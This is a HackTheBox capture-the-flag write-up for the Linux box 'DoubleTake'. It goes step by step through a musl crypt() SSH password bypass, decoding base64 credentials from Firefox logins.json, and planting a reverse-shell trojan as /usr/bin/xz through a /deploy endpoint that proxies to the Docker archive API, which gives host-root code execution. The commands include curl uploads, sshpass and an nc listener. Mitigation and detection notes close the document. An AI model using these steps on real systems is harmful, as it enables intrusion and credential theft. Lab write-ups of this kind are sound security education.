# DoubleTake

| Field | Value |
|---|---|
| Author | @black |
| Platform | HackTheBox |
| Category & Difficulty | Linux, Easy |
| Status | Live |
| Date | 2026-11-21 |
| Skills exercised | musl `crypt()` auth bypass, Firefox credential harvesting, Docker API archive abuse, decompression-binary hijack |

## TL;DR
An Alpine-based SSH service accepted a 300-byte password as the locked `alpine` user because musl's `crypt()` returns `"*"`, matching the shadow entry. Saved Firefox logins inside the container exposed credentials for the "Zentara" web app, whose `/deploy` endpoint proxies uploads to the Docker API. Replacing `/usr/bin/xz` inside the container and uploading a compressed archive made dockerd execute the trojan as host root (CVE-2026-41567).

## Reconnaissance & Enumeration
- `nmap -sC -sV -p- 10.129.3.106` → **22/tcp** OpenSSH 10.6p1 (Alpine/musl), **80/tcp** HTTP. SSH banner + Alpine motd confirmed a container, not the host → suggested looking for container-specific quirks.
- Hostname in the shell prompt: `7f906e0ee8ec` → Docker-style container ID.
- Port 80 hosted an "AI agent platform" login page (realm `Zentara`). Directory brute force found `/deploy` behind auth — the app's description mentioned agent workspaces → suggested an archive/workspace deployment feature.
- Dead end: default creds and login brute force on port 80 failed; no unauthenticated endpoints. The web app was only useful *after* the SSH foothold.

## Vulnerability Analysis
- **CVE-2026-123158 (OpenSSH on musl).** musl's `crypt()` returns `"*"` for a 300-byte password. The `alpine` account is locked, with `*` in `/etc/shadow`, so the comparison succeeds — a password-auth bypass that only works on musl-linked OpenSSH. Confirmed manually: first prompt returns `Permission denied`, a retry succeeds.
- **Cleartext-equivalent Firefox logins.** `~/.mozilla/firefox/zentara.default/logins.json` stored `encryptedUsername` / `encryptedPassword` as plain base64 (no master password). The `hostname` field (`http://172.17.0.1`, realm `Zentara`) revealed the app was reached through the Docker bridge gateway — useful context for the later Docker pivot.
- **Docker archive API abuse.** `/deploy` accepts a `multipart/form-data` archive + `workspace` and forwards it to `PUT /containers/{id}/archive`, extracting into the container filesystem. Any authenticated user can therefore write arbitrary paths inside the container.
- **CVE-2026-41567 (Docker 29.5.0).** The daemon resolves the decompression binary (`xz`) from the *container's* overlay filesystem instead of the host's when handling compressed archives. Overwriting `/usr/bin/xz` inside the container turns the next `.tar.xz` upload into host-root code execution.

## Exploitation & Post-Exploitation
1. **Initial access (SSH as `alpine`).** The bypass only needs a long password, no key or hash. First attempt failed, second succeeded — the exploit is not always first-try, so retry in a loop.
   ```
   alpine@10.129.3.106's password:   # 300 bytes
   Permission denied, please try again.
   alpine@10.129.3.106's password:   # same 300 bytes
   Welcome to Alpine!
   7f906e0ee8ec:~$
   ```
2. **Lateral movement to `bob`.** Read the saved Firefox logins and decoded the base64:
   ```
   cat ~/.mozilla/firefox/zentara.default/logins.json
   # "encryptedUsername":"Ym9i"                             -> bob
   # "encryptedPassword":"Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==" -> CorrectHorseBatteryStaple
   ```
   `sshpass` was **not** installed inside the container — run the pivot from the attacker box.
3. **User flag.**
   ```
   sshpass -p 'CorrectHorseBatteryStaple' ssh -o StrictHostKeyChecking=no \
       bob@10.129.3.106 'cat ~/user.txt'
   ```
   *(flag redacted)*
4. **Weaponise `xz`.** A static C reverse shell (see `scripts/xz.c`) is compiled and packaged so it lands at `/usr/bin/xz`:
   ```
   gcc -static -o xz xz.c
   mkdir -p pkg/usr/bin && cp xz pkg/usr/bin/xz
   (cd pkg && tar cf ../plant.tar usr/bin/xz)
   ```
5. **Plant the trojan through the deploy endpoint** (as `bob`):
   ```
   curl -u bob:CorrectHorseBatteryStaple \
        -F 'archive=@plant.tar' -F 'workspace=/' \
        http://10.129.3.106/deploy
   {"deployment":{"filename":"plant.tar", ... "status":"success","workspace":"/"},"status":"success"}
   ```
   `workspace=/` makes the archive extract at container root, so `usr/bin/xz` replaces the real binary.
6. **Trigger CVE-2026-41567 and catch root.** With a listener running (`nc -lvnp 4444`), upload any `.tar.xz`. The daemon invokes the container's `xz` to decompress it — as host root:
   ```
   connect to [10.10.14.95] from (UNKNOWN) [10.129.3.106] 50844
   root@doubletake:/# cat /root/root.txt
   ```
   The 500 from `/deploy` is expected; the trojan doesn't actually decompress anything.

## Flag
- `user.txt` — `/home/bob/user.txt` (32-hex, **redacted**)
- `root.txt` — `/root/root.txt` (32-hex, **redacted**)

## Lessons Learned
- **Pattern:** When SSH is musl-linked (Alpine), test absurdly long passwords against locked accounts — `crypt()` returning `"*"` can equal a `*` shadow entry. Retry the prompt; the first attempt may fail.
- **Pattern:** `logins.json` is not encryption. Base64-decoding `encryptedUsername`/`encryptedPassword` is a two-command win once you have any read access to a user profile.
- **Method:** An "upload archive" feature that proxies to the Docker archive API is a container-filesystem write primitive — inventory what runs in that filesystem (decompression tools, shells) before looking for kernel bugs.
- **Tooling:** Run `sshpass` from your own box; minimal Alpine containers won't have it. Save each stage's raw output to files so you can grep rather than re-exploit.

## Mitigation & Detection
- **Fix:** Patch OpenSSH/musl (or use a glibc build); lock accounts with `!` rather than `*` and disable password auth; patch Docker past 29.5.0; run dockerd without exposing the socket/API to app containers; never let the daemon execute binaries from a container-writable path (`--exec-opt`/PATH hardening, read-only `/usr` in containers).
- **Detect:** Alert on `crypt` failures with abnormally long password lengths; audit `PUT /containers/*/archive` requests and file changes under container `/usr/bin`; monitor dockerd children spawning shells or `xz` with network egress; flag `/deploy` 5xx spikes.

---

# Scripts

Repo layout:

```
htb-doubletake/
├── htb-doubletake.md
├── .gitignore
└── scripts/
    ├── pwn.sh
    ├── trigger.sh
    └── xz.c
```

See the `scripts/` directory for `pwn.sh`, `trigger.sh`, and `xz.c`.
